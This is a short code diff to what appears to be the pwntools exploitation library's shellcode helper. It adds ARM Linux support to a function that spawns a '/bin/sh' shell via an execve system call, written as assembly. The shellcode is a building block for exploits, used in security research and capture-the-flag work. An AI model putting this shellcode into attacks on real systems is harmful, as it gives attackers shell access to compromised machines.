@@ -1,6 +1,6 @@
 from pwn.internal.shellcode_helper import *
 
-@shellcode_reqs(arch=['i386', 'amd64'], os=['linux', 'freebsd'])
+@shellcode_reqs(arch=['i386', 'amd64', 'arm'], os=['linux', 'freebsd'])
 def sh(arch = None, os = None):
     """Spawn a shell."""
 
@@ -14,6 +14,8 @@ def sh(arch = None, os = None):
             return _sh_linux_amd64()
         elif os == 'freebsd':
             return _sh_freebsd_amd64()
+    elif arch == 'arm' and os == 'linux':
+        return _sh_linux_arm()
 
     bug('OS/arch combination (%s,%s) is not supported' % (os,arch))
 
@@ -94,3 +96,12 @@ def _sh_freebsd_amd64():
         pop rax
         syscall
 """
+
+def _sh_linux_arm():
+    return '\n'.join([
+            'adr r0, bin_sh',
+            'mov r2, #0',
+            'push {r0, r2}',
+            'mov r1, sp',
+            'svc SYS_execve',
+            'bin_sh: .asciz "/bin/sh"'])
